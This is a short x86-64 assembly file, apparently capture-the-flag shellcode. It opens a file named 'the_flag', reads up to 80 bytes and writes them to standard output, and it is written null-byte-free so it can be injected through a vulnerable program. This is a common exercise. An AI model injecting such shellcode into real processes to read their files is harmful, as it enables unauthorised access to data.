BITS 64

global  _start              ; telling where program execution should start

_start:                     ; this is where code starts getting exec'ed
    xor rax, rax
    push rax
    mov rbx, 0x67616c665f656874 ; the_flag
    push rbx 
    
    mov rdi, rsp
    xor   rsi, rsi
    xor   rdx, rdx
    mov   al,0x2            ; open(
    syscall                 ; );

    mov   rdi,rax           ;   file_descriptor,
    xor   rax, rax          ; read(
    sub   rsp,0x50          ;   allocate a space for buffer  
    push  rsp               ;   push buffer's address to stack
    pop   rsi               ;   *buf,
    mov   dl,0x50           ;   *bufsize
    syscall                 ; );

    ; write to STDOUT
    mov   rdx, rax
    mov   al,0x1            ; write(
    mov   dil,0x1           ;   STDOUT,
    syscall                 ; );

    mov al, 60              ; exit
    syscall
